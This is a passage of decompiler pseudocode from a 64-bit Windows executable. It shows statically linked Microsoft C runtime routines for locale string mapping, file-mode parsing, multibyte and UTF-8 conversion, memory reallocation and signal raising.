                  v25 = _acrt_WideCharToMultiByte(v13, 0, (_DWORD)v29, v25, (_DWORD)a6, a7, v34, v35);
                  if ( v25 == 0 )
                    goto LABEL_42;
                }
                else
                {
                  v25 = _acrt_WideCharToMultiByte(v13, 0, (_DWORD)v29, v25, 0, 0, v34, v35);
                  if ( v25 == 0 )
                    goto LABEL_41;
                }
                if ( *((_DWORD *)v29 - 4) == 56797 )
                  free_base(v29 - 8);
                goto LABEL_47;
              }
LABEL_41:
              if ( v29 != nullptr )
              {
LABEL_42:
                if ( *((_DWORD *)v29 - 4) == 56797 )
                  free_base(v29 - 8);
              }
LABEL_44:
              v25 = 0;
              goto LABEL_47;
            }
          }
        }
LABEL_46:
        v25 = 0;
        if ( v22 == nullptr )
          return v25;
LABEL_47:
        if ( *((_DWORD *)v22 - 4) == 56797 )
          free_base((void *)(v22 - 8));
        return v25;
      }
      *(_DWORD *)v23 = 56797;
    }
    else
    {
      v18 = v17 + 15;
      if ( v17 + 15 < v17 )
        v18 = 0xFFFFFFFFFFFFFF0LL;
      v19 = v18 & 0xFFFFFFFFFFFFFFF0uLL;
      v20 = alloca(v19);
      v21 = alloca(v19);
      v22 = (const WCHAR *)&v36;
      if ( v31 == (_BYTE *)-80LL )
        goto LABEL_46;
      v36 = 52428;
    }
    v22 += 8;
    goto LABEL_15;
  }
  return result;
}


// ----- __acrt_LCMapStringA @ 0x140021a8c -----
__int64 __fastcall _acrt_LCMapStringA(
        struct __crt_locale_pointers *a1,
        wchar_t *a2,
        DWORD a3,
        char *a4,
        int a5,
        char *a6,
        int a7,
        unsigned int a8,
        int a9)
{
  __int64 result; // rax
  __int64 v13; // [rsp+50h] [rbp-28h] BYREF
  struct __crt_locale_pointers v14; // [rsp+58h] [rbp-20h] BYREF
  char v15; // [rsp+68h] [rbp-10h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v13, a1);
  result = __acrt_LCMapStringA_stat(&v14, a2, a3, a4, a5, a6, a7, a8, a9);
  if ( v15 != 0 )
    *(_DWORD *)(v13 + 936) &= ~2u;
  return result;
}


// ----- sub_140021B30 @ 0x140021b30 -----
__int64 __fastcall sub_140021B30(_WORD *a1, __int64 a2, __int64 a3)
{
  _WORD *v3; // r9
  __int64 v5; // r8
  __int16 v6; // ax

  v3 = a1;
  if ( a1 == nullptr || a2 == 0 )
    goto LABEL_5;
  if ( a3 == 0 )
  {
    *a1 = 0;
LABEL_5:
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
  v5 = a3 - (_QWORD)a1;
  while ( 1 )
  {
    v6 = *(_WORD *)((char *)a1 + v5);
    *a1++ = v6;
    if ( v6 == 0 )
      break;
    if ( --a2 == 0 )
    {
      *v3 = 0;
      *(_DWORD *)sub_140018888() = 34;
      invalid_parameter_noinfo();
      return 34;
    }
  }
  return 0;
}


// ----- ??$__acrt_stdio_parse_mode@_W@@YA?AU__acrt_stdio_stream_mode@@QEB_W@Z @ 0x140021bb4 -----
__int64 __fastcall __acrt_stdio_parse_mode<wchar_t>(__int64 a1, __int16 *a2)
{
  __int16 *v2; // r8
  __int16 i; // ax
  _WORD *v5; // r8
  char v6; // dl
  char v7; // r9
  char v8; // di
  char v9; // r10
  char v10; // r11
  __int64 v11; // rsi
  unsigned int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // ecx
  unsigned int v15; // ecx
  unsigned int v16; // ecx
  unsigned int v17; // ecx
  int v18; // eax
  unsigned int v19; // ecx
  unsigned int v20; // ecx
  unsigned int v21; // ecx
  unsigned int v22; // ecx
  unsigned int v23; // ecx
  _WORD *v24; // rdi
  bool v25; // zf
  _WORD *j; // rdi
  _WORD *k; // rcx

  v2 = a2;
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 4) = dword_1400A0568;
  for ( i = *a2; i == 32; i = *v2 )
    ++v2;
  if ( i == 97 )
  {
    *(_DWORD *)a1 = 265;
LABEL_10:
    *(_DWORD *)(a1 + 4) = 2;
    goto LABEL_11;
  }
  if ( i != 114 )
  {
    if ( i != 119 )
      goto LABEL_81;
    *(_DWORD *)a1 = 769;
    goto LABEL_10;
  }
  *(_DWORD *)(a1 + 4) = 1;
LABEL_11:
  v5 = v2 + 1;
  v6 = 1;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 5;
  while ( *v5 != 0 )
  {
    v12 = (unsigned __int16)*v5;
    if ( v12 > 0x53 )
    {
      v19 = v12 - 84;
      if ( v19 == 0 )
      {
        if ( (*(_DWORD *)a1 & 0x1000) == 0 )
        {
          v18 = *(_DWORD *)a1 | 0x1000;
LABEL_53:
          *(_DWORD *)a1 = v18;
LABEL_54:
          v6 = 1;
          goto LABEL_55;
        }
        goto LABEL_51;
      }
      v20 = v19 - 14;
      if ( v20 == 0 )
      {
        if ( (*(_DWORD *)a1 & 0xC000) == 0 )
        {
          v18 = *(_DWORD *)a1 | 0x8000;
          goto LABEL_53;
        }
        goto LABEL_51;
      }
      v21 = v20 - 1;
      if ( v21 != 0 )
      {
        v22 = v21 - 11;
        if ( v22 != 0 )
        {
          v23 = v22 - 6;
          if ( v23 != 0 )
          {
            if ( v23 != 4 )
              goto LABEL_81;
            if ( (*(_DWORD *)a1 & 0x200) != 0 )
            {
              v18 = *(_DWORD *)a1 | 0x400;
              goto LABEL_53;
            }
          }
          else if ( (*(_DWORD *)a1 & 0xC000) == 0 )
          {
            v18 = *(_DWORD *)a1 | 0x4000;
            goto LABEL_53;
          }
          goto LABEL_51;
        }
        if ( v7 != 0 )
          goto LABEL_51;
        *(_DWORD *)(a1 + 4) &= ~0x800u;
      }
      else
      {
        if ( v7 != 0 )
          goto LABEL_51;
        *(_DWORD *)(a1 + 4) |= 0x800u;
      }
      v7 = 1;
      v6 = 1;
    }
    else
    {
      if ( v12 == 83 )
      {
        if ( v9 != 0 )
          goto LABEL_51;
        *(_DWORD *)a1 |= 0x20u;
LABEL_32:
        v9 = 1;
        v6 = 1;
        goto LABEL_55;
      }
      v13 = v12 - 32;
      if ( v13 != 0 )
      {
        v14 = v13 - 11;
        if ( v14 != 0 )
        {
          v15 = v14 - 1;
          if ( v15 == 0 )
          {
            v10 = 1;
LABEL_51:
            v6 = 0;
            goto LABEL_55;
          }
          v16 = v15 - 24;
          if ( v16 == 0 )
          {
            if ( (*(_DWORD *)a1 & 0x40) == 0 )
            {
              v18 = *(_DWORD *)a1 | 0x40;
              goto LABEL_53;
            }
            goto LABEL_51;
          }
          v17 = v16 - 10;
          if ( v17 == 0 )
          {
            *(_DWORD *)a1 |= 0x80u;
            goto LABEL_54;
          }
          if ( v17 != 4 )
            goto LABEL_81;
          if ( v9 != 0 )
            goto LABEL_51;
          *(_DWORD *)a1 |= 0x10u;
          goto LABEL_32;
        }
        if ( v8 != 0 )
          goto LABEL_51;
        v8 = 1;
        if ( (*(_DWORD *)a1 & 2) != 0 )
          goto LABEL_51;
        v6 = 1;
        *(_DWORD *)a1 = *(_DWORD *)a1 & 0xFFFFFFFC | 2;
        *(_DWORD *)(a1 + 4) = *(_DWORD *)(a1 + 4) & 0xFFFFFFF8 | 4;
      }
    }
LABEL_55:
    v5 = (_WORD *)((char *)v5 + (v6 != 0 ? 2 : 0));
    if ( v6 == 0 )
      break;
  }
  v24 = v5 + 1;
  if ( v10 == 0 )
    v24 = v5;
  while ( *v24 == 32 )
    ++v24;
  if ( v10 == 0 )
  {
    v25 = *v24 == 0;
    goto LABEL_63;
  }
  if ( (unsigned int)sub_140026080(v24, L"ccs", 3) != 0 )
    goto LABEL_81;
  for ( j = v24 + 3; *j == 32; ++j )
    ;
  if ( *j != 61 )
    goto LABEL_81;
  do
    ++j;
  while ( *j == 32 );
  if ( (unsigned int)sub_1400280C0(j, L"UTF-8", 5) == 0 )
  {
    *(_DWORD *)a1 |= 0x40000u;
    goto LABEL_77;
  }
  if ( (unsigned int)sub_1400280C0(j, L"UTF-16LEUNICODE", 8) == 0 )
  {
    *(_DWORD *)a1 |= 0x20000u;
    v11 = 8;
    goto LABEL_77;
  }
  if ( (unsigned int)sub_1400280C0(j, L"UNICODE", 7) != 0 )
    goto LABEL_81;
  *(_DWORD *)a1 |= 0x10000u;
  v11 = 7;
LABEL_77:
  for ( k = &j[v11]; *k == 32; ++k )
    ;
  v25 = *k == 0;
LABEL_63:
  if ( !v25 )
  {
LABEL_81:
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return a1;
  }
  *(_BYTE *)(a1 + 8) = 1;
  return a1;
}


// ----- _wopenfile @ 0x140021eb8 -----
__int64 __fastcall wopenfile(int a1, __int16 *a2, int a3, __int64 a4)
{
  __int64 v7; // rax
  __int64 v8; // rbx
  int v9; // eax
  __int64 v11; // [rsp+30h] [rbp-28h]
  __int64 v12; // [rsp+40h] [rbp-18h] BYREF
  int v13; // [rsp+70h] [rbp+18h] BYREF

  v7 = __acrt_stdio_parse_mode<wchar_t>((__int64)&v12, a2);
  v8 = 0;
  v11 = *(_QWORD *)v7;
  if ( *(_BYTE *)(v7 + 8) != 0 )
  {
    v13 = 0;
    if ( (unsigned int)sub_140028F2C((unsigned int)&v13, a1, v11, a3, 384) == 0 )
    {
      ++dword_1400A0170;
      _InterlockedOr((volatile signed __int32 *)(a4 + 20), HIDWORD(v11));
      v9 = v13;
      *(_DWORD *)(a4 + 16) = 0;
      *(_QWORD *)(a4 + 40) = 0;
      *(_QWORD *)(a4 + 8) = 0;
      *(_QWORD *)a4 = 0;
      v8 = a4;
      *(_DWORD *)(a4 + 24) = v9;
    }
  }
  return v8;
}


// ----- _realloc_base @ 0x140021f60 -----
void *__cdecl realloc_base(void *Block, size_t Size)
{
  void *result; // rax

  if ( Block == nullptr )
    return malloc_base(Size);
  if ( Size == 0 )
  {
    free_base(Block);
    return nullptr;
  }
  if ( Size > 0xFFFFFFFFFFFFFFE0uLL )
  {
LABEL_6:
    *(_DWORD *)sub_140018888() = 12;
    return nullptr;
  }
  while ( 1 )
  {
    result = HeapReAlloc(hHeap, 0, Block, Size);
    if ( result != nullptr )
      return result;
    if ( (unsigned int)sub_14001B360() == 0 || (unsigned int)sub_14001B3B0(Size) == 0 )
      goto LABEL_6;
  }
}


// ----- iswctype @ 0x140021fdc -----
int __cdecl iswctype(wint_t C, wctype_t Type)
{
  int v2; // ebx
  int v3; // eax
  WORD CharType; // [rsp+30h] [rbp+8h] BYREF
  WCHAR SrcStr; // [rsp+40h] [rbp+18h] BYREF

  v2 = Type;
  if ( C != 0xFFFF )
  {
    if ( C < 0x100u )
    {
      v3 = *((unsigned __int16 *)off_14009EA68 + C);
      return v2 & v3;
    }
    SrcStr = C;
    CharType = 0;
    if ( GetStringTypeW(1u, &SrcStr, 1, &CharType) )
    {
      v3 = CharType;
      return v2 & v3;
    }
  }
  return 0;
}


// ----- _mbtowc_internal @ 0x140022048 -----
__int64 __fastcall mbtowc_internal(_WORD *a1, unsigned __int8 *a2, unsigned __int64 a3, __int64 a4)
{
  __int64 v8; // rdx
  unsigned int v9; // r10d
  __int64 result; // rax
  int v11; // r9d

  if ( a2 == nullptr || a3 == 0 )
  {
    qword_1400A0A98 = 0;
    return 0;
  }
  if ( *a2 == 0 )
  {
    if ( a1 != nullptr )
      *a1 = 0;
    return 0;
  }
  if ( *(_BYTE *)(a4 + 40) == 0 )
    __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)a4);
  v8 = *(_QWORD *)(a4 + 24);
  v9 = *(_DWORD *)(v8 + 12);
  if ( v9 != 65001 )
  {
    if ( *(_QWORD *)(v8 + 312) == 0 )
    {
      if ( a1 != nullptr )
        *a1 = *a2;
      return 1;
    }
    if ( *(__int16 *)(*(_QWORD *)v8 + 2LL * *a2) >= 0 )
    {
      if ( (unsigned int)sub_140022950(v9, 9, a2) != 0 )
        return 1;
    }
    else
    {
      v11 = *(_DWORD *)(v8 + 8);
      if ( v11 > 1 && (int)a3 >= v11 && (unsigned int)sub_140022950(v9, 9, a2) != 0
        || a3 >= *(int *)(*(_QWORD *)(a4 + 24) + 8LL) && a2[1] != 0 )
      {
        return *(unsigned int *)(*(_QWORD *)(a4 + 24) + 8LL);
      }
    }
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 42;
    return 0xFFFFFFFFLL;
  }
  result = sub_14002245C((_DWORD)a1, (_DWORD)a2, a3, (unsigned int)&qword_1400A0A98, a4);
  if ( (int)result < 0 )
    return 0xFFFFFFFFLL;
  return result;
}


// ----- sub_1400221C0 @ 0x1400221c0 -----
char __fastcall sub_1400221C0(char *a1)
{
  char v1; // dl
  char result; // al

  v1 = *a1;
  if ( *a1 >= 0 )
    return *a1 != 0;
  if ( (v1 & 0xE0) == 0xC0 )
    return 2;
  if ( (v1 & 0xF0) == 0xE0 )
    return 3;
  result = -1;
  if ( (v1 & 0xF8) == 0xF0 )
    return 4;
  return result;
}


// ----- sub_1400221F8 @ 0x1400221f8 -----
unsigned __int64 __fastcall sub_1400221F8(
        __int64 a1,
        char *a2,
        unsigned __int64 a3,
        __crt_mbstring *a4,
        struct _Mbstatet *a5)
{
  __crt_mbstring *v5; // rbx
  char *v6; // rdi
  unsigned __int64 v8; // rbp
  _DWORD *v9; // r14
  int v11; // eax
  int v12; // eax
  unsigned __int8 v13; // r9
  unsigned int v14; // edx
  unsigned __int64 v15; // r10
  char v16; // cl
  _DWORD v17[6]; // [rsp+18h] [rbp-60h]

  v5 = (__crt_mbstring *)&unk_1400A0AA0;
  v6 = (char *)&unk_14008C378;
  if ( a4 != nullptr )
    v5 = a4;
  v8 = 1;
  if ( a2 != nullptr )
  {
    v8 = a3;
    v6 = a2;
  }
  v9 = (_DWORD *)(a1 & -(__int64)(a2 != nullptr));
  if ( v8 == 0 )
    return -2;
  if ( *((_WORD *)v5 + 3) != 0 )
  {
    LOBYTE(a3) = *((_BYTE *)v5 + 4);
    v14 = *(_DWORD *)v5;
    v13 = *((_BYTE *)v5 + 6);
    if ( (unsigned __int8)(a3 - 2) > 2u || v13 == 0 || v13 >= (unsigned __int8)a3 )
      return __crt_mbstring::return_illegal_sequence(v5, a5, (struct __crt_cached_ptd_host *)a3);
    goto LABEL_17;
  }
  LOBYTE(v11) = sub_1400221C0(v6);
  a3 = v11;
  v12 = (unsigned __int8)*v6++;
  if ( (unsigned int)a3 > 1 )
  {
    if ( (unsigned int)(a3 - 2) > 2 )
      return __crt_mbstring::return_illegal_sequence(v5, a5, (struct __crt_cached_ptd_host *)a3);
    v13 = a3;
    v14 = v12 & ((1 << (7 - a3)) - 1);
LABEL_17:
    v15 = v13;
    if ( v13 >= v8 )
      v15 = v8;
    while ( v6 - a2 < v15 )
    {
      v16 = *v6++;
      if ( (v16 & 0xC0) != 0x80 )
        return __crt_mbstring::return_illegal_sequence(v5, a5, (struct __crt_cached_ptd_host *)a3);
      v14 = (v14 << 6) | v16 & 0x3F;
    }
    if ( v15 < v13 )
    {
      *((_WORD *)v5 + 2) = (unsigned __int8)a3;
      *((_WORD *)v5 + 3) = (unsigned __int8)(v13 - v15);
      *(_DWORD *)v5 = v14;
      return -2;
    }
    if ( v14 - 55296 > 0x7FF && v14 < 0x110000 )
    {
      v17[2] = 128;
      v17[3] = 2048;
      v17[4] = 0x10000;
      if ( v14 >= v17[(unsigned __int8)a3] )
      {
        if ( v9 != nullptr )
          *v9 = v14;
        return __crt_mbstring::reset_and_return(
                 (__crt_mbstring *)(v13 & (unsigned __int64)-(__int64)(v14 != 0)),
                 (unsigned __int64)v5,
                 (struct _Mbstatet *)a3);
      }
    }
    return __crt_mbstring::return_illegal_sequence(v5, a5, (struct __crt_cached_ptd_host *)a3);
  }
  if ( v9 != nullptr )
    *v9 = v12;
  return a3;
}


// ----- ?__c16rtomb_utf8@__crt_mbstring@@YA_KPEAD_SPEAU_Mbstatet@@AEAV__crt_cached_ptd_host@@@Z @ 0x1400223b8 -----
__int64 __fastcall __crt_mbstring::__c16rtomb_utf8(
        __crt_mbstring *this,
        char *a2,
        struct __crt_cached_ptd_host *a3,
        struct _Mbstatet *a4)
{
  __crt_mbstring *v4; // rbx
  unsigned __int16 v5; // ax
  __crt_mbstring *v7; // rax
  struct _Mbstatet *v8; // r8
  __int64 v9; // [rsp+40h] [rbp+18h] BYREF

  v4 = (__crt_mbstring *)&unk_1400A0AA8;
  if ( a3 != nullptr )
    v4 = a3;
  v5 = (_WORD)a2 + 9216;
  if ( *(_DWORD *)v4 != 0 )
  {
    if ( v5 > 0x3FFu )
      return __crt_mbstring::return_illegal_sequence(v4, a4, a3);
    v9 = 0;
    v7 = (__crt_mbstring *)sub_140028F68(this, *(_DWORD *)v4 + ((unsigned __int16)a2 & 0x23FFu), &v9, a4);
    return __crt_mbstring::reset_and_return(v7, (unsigned __int64)v4, v8);
  }
  else
  {
    if ( v5 <= 0x3FFu )
      return __crt_mbstring::return_illegal_sequence(v4, a4, a3);
    if ( (unsigned __int16)((_WORD)a2 + 10240) > 0x3FFu )
    {
      return sub_140028F68(this, (unsigned __int16)a2, v4, a4);
    }
    else
    {
      *(_DWORD *)v4 = (((unsigned __int16)a2 << 10) & 0x49FFC00) + 0x10000;
      return 0;
    }
  }
}


// ----- sub_14002245C @ 0x14002245c -----
unsigned __int64 __fastcall sub_14002245C(
        __int16 *a1,
        char *a2,
        unsigned __int64 a3,
        __crt_mbstring *a4,
        struct _Mbstatet *a5)
{
  unsigned __int64 result; // rax
  __int16 v7; // cx
  unsigned int v8[6]; // [rsp+30h] [rbp-18h] BYREF

  v8[0] = 0;
  result = sub_1400221F8((__int64)v8, a2, a3, a4, a5);
  if ( result <= 4 )
  {
    v7 = v8[0];
    if ( v8[0] > 0xFFFF )
      v7 = -3;
    if ( a1 != nullptr )
      *a1 = v7;
  }
  return result;
}


// ----- sub_1400224A4 @ 0x1400224a4 -----
__int64 __fastcall sub_1400224A4(_WORD *a1, char **a2, unsigned __int64 a3, __crt_mbstring *a4, __int64 a5)
{
  char *v5; // rdi
  unsigned __int64 v7; // rsi
  _WORD *v10; // rbx
  __int64 v11; // r15
  unsigned __int64 v12; // r8
  unsigned __int64 v13; // rax
  __int16 v14; // cx
  unsigned int v15; // ecx
  __int64 i; // rbx
  __int64 v18; // rsi
  unsigned __int64 v19; // r8
  unsigned __int64 v20; // rax
  __int64 v21; // rcx
  unsigned int v22; // [rsp+60h] [rbp+8h] BYREF

  v5 = *a2;
  v7 = a3;
  if ( a1 == nullptr )
  {
    v18 = a5;
    for ( i = 0; ; i = v21 + 1 )
    {
      if ( *v5 != 0 )
        v19 = v5[1] != 0 ? (v5[2] != 0) + 3LL : 2LL;
      else
        v19 = 1;
      v20 = sub_1400221F8(0, v5, v19, a4, (struct _Mbstatet *)v18);
      if ( v20 == -1 )
        break;
      if ( v20 == 0 )
        return i;
      v21 = i + 1;
      v5 += v20;
      if ( v20 != 4 )
        v21 = i;
    }
    *(_BYTE *)(v18 + 48) = 1;
    *(_DWORD *)(v18 + 44) = 42;
    return -1;
  }
  v10 = a1;
  if ( a3 != 0 )
  {
    v11 = a5;
    while ( 1 )
    {
      if ( *v5 != 0 )
        v12 = v5[1] != 0 ? (v5[2] != 0) + 3LL : 2LL;
      else
        v12 = 1;
      v22 = 0;
      v13 = sub_1400221F8((__int64)&v22, v5, v12, a4, (struct _Mbstatet *)v11);
      if ( v13 == -1 )
        break;
      if ( v13 == 0 )
      {
        v5 = nullptr;
        *v10 = 0;
        goto LABEL_15;
      }
      v14 = v22;
      if ( v22 > 0xFFFF )
      {
        if ( v7 <= 1 )
          goto LABEL_15;
        v15 = v22 - 0x10000;
        v22 = v15;
        --v7;
        *v10++ = (v15 >> 10) | 0xD800;
        v14 = v15 & 0x3FF | 0xDC00;
      }
      *v10 = v14;
      v5 += v13;
      ++v10;
      if ( --v7 == 0 )
        goto LABEL_15;
    }
    *a2 = v5;
    *(_BYTE *)(v11 + 48) = 1;
    *(_DWORD *)(v11 + 44) = 42;
    return -1;
  }
LABEL_15:
  *a2 = v5;
  return v10 - a1;
}


// ----- ??$?RV_lambda_450d765d439847d4c735a33c368b5fc0_@@AEAV_lambda_44731a7d0e6d81c3e6aa82d741081786_@@V_lambda_601a2a7da3b7a96e9554ac7215c4b07c_@@@?$__crt_seh_guarded_call@P6AXH@Z@@QEAAP6AXH@Z$$QEAV_lambda_450d765d439847d4c735a33c368b5fc0_@@AEAV_lambda_44731a7d0e6d81c3e6aa82d741081786_@@$$QEAV_lambda_601a2a7da3b7a96e9554ac7215c4b07c_@@@Z @ 0x14002265c -----
__int64 __fastcall __crt_seh_guarded_call<void (*)(int)>::operator()<_lambda_450d765d439847d4c735a33c368b5fc0_,_lambda_44731a7d0e6d81c3e6aa82d741081786_ &,_lambda_601a2a7da3b7a96e9554ac7215c4b07c_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  __int64 v5; // rbx

  _vcrt_lock(*a2);
  v5 = __ROR8__(_security_cookie ^ qword_1400A0AC0, _security_cookie & 0x3F);
  _vcrt_unlock(*a4);
  return v5;
}


// ----- __acrt_get_sigabrt_handler @ 0x1400226a4 -----
__int64 _acrt_get_sigabrt_handler()
{
  __int64 v1; // [rsp+30h] [rbp+8h] BYREF
  int v2; // [rsp+38h] [rbp+10h] BYREF
  int v3; // [rsp+40h] [rbp+18h] BYREF

  v2 = 3;
  v3 = 3;
  return __crt_seh_guarded_call<void (*)(int)>::operator()<_lambda_450d765d439847d4c735a33c368b5fc0_,_lambda_44731a7d0e6d81c3e6aa82d741081786_ &,_lambda_601a2a7da3b7a96e9554ac7215c4b07c_>(
           (__int64)&v1,
           &v3,
           (__int64)&v1,
           &v2);
}


// ----- __acrt_initialize_signal_handlers @ 0x1400226d4 -----
void __fastcall _acrt_initialize_signal_handlers(__int64 a1)
{
  qword_1400A0AB0 = a1;
  qword_1400A0AB8 = a1;
  qword_1400A0AC0 = a1;
  qword_1400A0AC8 = a1;
}


// ----- raise @ 0x1400226f4 -----
int __cdecl raise(int Signal)
{
  struct __acrt_ptd *v2; // r15
  char v3; // r14
  __int64 v4; // rdx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  __int64 *v9; // rdi
  struct __acrt_ptd *v10; // rax
  __int64 v12; // rax
  __int64 v13; // rcx
  __int64 v14; // r13
  __int64 v15; // rsi
  int v16; // r12d
  __int64 v17; // rax
  __int64 v18; // rcx
  __int64 v19; // rax
  int v20; // [rsp+78h] [rbp+10h]

  v2 = nullptr;
  v20 = 0;
  v3 = 1;
  v4 = (unsigned int)(Signal - 2);
  if ( Signal != 2 )
  {
    if ( Signal == 4 )
      goto LABEL_14;
    v4 = (unsigned int)(Signal - 6);
    if ( Signal == 6 )
      goto LABEL_8;
    if ( Signal == 8 || Signal == 11 )
    {
LABEL_14:
      v10 = sub_14001C838();
      v2 = v10;
      if ( v10 == nullptr )
        return -1;
      v12 = *(_QWORD *)v10;
      v13 = v12 + 192;
      while ( v12 != v13 )
      {
        if ( *(_DWORD *)(v12 + 4) == Signal )
          goto LABEL_21;
        v12 += 16;
      }
      v12 = 0;
LABEL_21:
      if ( v12 != 0 )
      {
        v9 = (__int64 *)(v12 + 8);
        v3 = 0;
        goto LABEL_28;
      }
    }
    else
    {
      v4 = (unsigned int)(Signal - 15);
      if ( Signal == 15 )
        goto LABEL_8;
      v4 = (unsigned int)(Signal - 21);
      if ( (unsigned int)v4 <= 1 )
        goto LABEL_8;
    }
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return -1;
  }
LABEL_8:
  v5 = Signal - 2;
  if ( v5 != 0 )
  {
    v6 = v5 - 4;
    if ( v6 == 0 )
    {
LABEL_24:
      v9 = &qword_1400A0AC0;
      goto LABEL_28;
    }
    v7 = v6 - 9;
    if ( v7 != 0 )
    {
      v8 = v7 - 6;
      if ( v8 != 0 )
      {
        if ( v8 != 1 )
        {
          v9 = nullptr;
          goto LABEL_28;
        }
        goto LABEL_24;
      }
      v9 = &qword_1400A0AB8;
    }
    else
    {
      v9 = &qword_1400A0AC8;
    }
  }
  else
  {
    v9 = &qword_1400A0AB0;
  }
LABEL_28:
  v14 = 0;
  if ( v3 != 0 )
    _vcrt_lock(3);
  v15 = *v9;
  if ( v3 != 0 )
    v15 = __ROR8__(_security_cookie ^ v15, _security_cookie & 0x3F);
  if ( v15 == 1 )
  {
    v16 = 2320;
    goto LABEL_44;
  }
  if ( v15 == 0 )
  {
    if ( v3 != 0 )
      _vcrt_unlock(3);
    exit(3);
  }
  v16 = 2320;
  if ( (unsigned int)Signal > 0xB || !_bittest(&v16, Signal) )
    goto LABEL_38;
  v14 = *((_QWORD *)v2 + 1);
  *((_QWORD *)v2 + 1) = 0;
  if ( Signal == 8 )
  {
    v20 = *(_DWORD *)(sub_14001C7D8() + 16);
    *(_DWORD *)(sub_14001C7D8() + 16) = 140;
LABEL_38:
    if ( Signal == 8 )
    {
      v17 = *(_QWORD *)v2 + 48LL;
      v18 = *(_QWORD *)v2 + 192LL;
      while ( v17 != v18 )
      {
        *(_QWORD *)(v17 + 8) = 0;
        v17 += 16;
      }
      goto LABEL_44;
    }
  }
  *v9 = _security_cookie;
LABEL_44:
  if ( v3 != 0 )
    _vcrt_unlock(3);
  if ( v15 != 1 )
  {
    if ( Signal == 8 )
    {
      v19 = sub_14001C7D8();
      ((void (__fastcall *)(__int64, _QWORD))v15)(8, *(unsigned int *)(v19 + 16));
    }
    else
    {
      ((void (__fastcall *)(_QWORD, __int64))v15)((unsigned int)Signal, v4);
    }
    if ( (unsigned int)Signal <= 0xB && _bittest(&v16, Signal) )
    {
      *((_QWORD *)v2 + 1) = v14;
      if ( Signal == 8 )
        *(_DWORD *)(sub_14001C7D8() + 16) = v20;
    }
  }
  return 0;
}


// ----- sub_140022950 @ 0x140022950 -----
int __fastcall sub_140022950(UINT a1, char a2, const CHAR *a3, int a4, WCHAR *a5, int a6)
{
  bool v6; // zf

  if ( a1 > 0xDEAC )
  {
    if ( a1 == 57005
      || a1 == 57006
      || a1 == 57007
      || a1 == 57008
      || a1 == 57009
      || a1 == 57010
      || a1 == 57011
      || a1 == 65000 )
    {
      goto LABEL_15;
    }
    if ( a1 != 65001 )
      return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);
    goto LABEL_26;
  }
  if ( a1 == 57004 )
    goto LABEL_15;
  if ( a1 > 0xC433 )
  {
    if ( a1 == 50229 )
      goto LABEL_15;
    if ( a1 != 54936 )
    {
      if ( a1 != 57002 )
      {
        v6 = a1 == 57003;
        goto LABEL_14;
      }
LABEL_15:
      a2 = 0;
      return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);
    }
LABEL_26:
    a2 &= 8u;
    return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);
  }
  if ( a1 == 50227 || a1 == 42 || a1 == 50220 || a1 == 50221 || a1 == 50222 )
    goto LABEL_15;
  v6 = a1 == 50225;
LABEL_14:
  if ( v6 )
    goto LABEL_15;
  return MultiByteToWideChar(a1, a2, a3, a4, a5, a6);
}


// ----- __acrt_WideCharToMultiByte @ 0x1400229e0 -----
int __fastcall _acrt_WideCharToMultiByte(
        UINT a1,
        int a2,
        const WCHAR *a3,
        int a4,
        CHAR *a5,
        int a6,
        const CHAR *a7,
        BOOL *a8)
{
  bool v10; // zf
  bool v11; // zf
  UINT v12; // eax
  DWORD v13; // edx
  BOOL *v15; // r8

  if ( a1 > 0xDEAC )
  {
    if ( a1 == 57005 || a1 == 57006 || a1 == 57007 || a1 == 57008 || a1 == 57009 || a1 == 57010 || a1 == 57011 )
      goto LABEL_25;
    v12 = a1 - 65000;
    v11 = a1 == 65000;
    goto LABEL_21;
  }
  if ( a1 == 57004 )
    goto LABEL_25;
  if ( a1 > 0xC433 )
  {
    if ( a1 != 50229 && a1 != 54936 )
    {
      v12 = a1 - 57002;
      v11 = a1 == 57002;
LABEL_21:
      if ( !v11 )
      {
        v10 = v12 == 1;
        goto LABEL_23;
      }
    }
LABEL_25:
    v13 = 0;
    goto LABEL_26;
  }
  if ( a1 == 50227 || a1 == 42 || a1 == 50220 || a1 == 50221 || a1 == 50222 )
    goto LABEL_25;
  v10 = a1 == 50225;
LABEL_23:
  if ( v10 )
    goto LABEL_25;
  v13 = a2 & 0xFFFFFF7F;
LABEL_26:
  v15 = a8;
  if ( a1 - 65000 <= 1 )
  {
    v15 = nullptr;
    a7 = nullptr;
    if ( a8 != nullptr )
      *a8 = false;
  }
  return WideCharToMultiByte(a1, v13, a3, a4, a5, a6, a7, v15);
}


// ----- sub_140022AC0 @ 0x140022ac0 -----
__int64 __fastcall sub_140022AC0(__int64 a1, __int64 a2)
{
  if ( a1 == 0 || a2 == 0 )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
  }
  return 0x7FFFFFFF;
}


// ----- sub_140022AF0 @ 0x140022af0 -----
__int64 __fastcall sub_140022AF0(unsigned __int16 *a1, unsigned __int16 *a2)
{
  int v3; // r8d
  int v4; // r9d
  int v5; // ecx
  int v6; // ecx
  __int64 result; // rax

  do
  {
    v3 = *a1++;
    v4 = *a2++;
    if ( v3 != v4 )
    {
      v5 = v3 + 32;
      if ( (unsigned int)(v3 - 65) > 0x19 )
        v5 = v3;
      v3 = v5;
      v6 = v4 + 32;
      if ( (unsigned int)(v4 - 65) > 0x19 )
        v6 = v4;
      v4 = v6;
    }
    result = (unsigned int)(v3 - v4);
  }
  while ( v3 == v4 && v3 != 0 );
  return result;
}


// ----- sub_140022B50 @ 0x140022b50 -----
__int64 __fastcall sub_140022B50(__int64 a1, __int64 a2)
{
  if ( dword_1400A0560 != 0 )
    return sub_140022B80(a1, a2, 0);
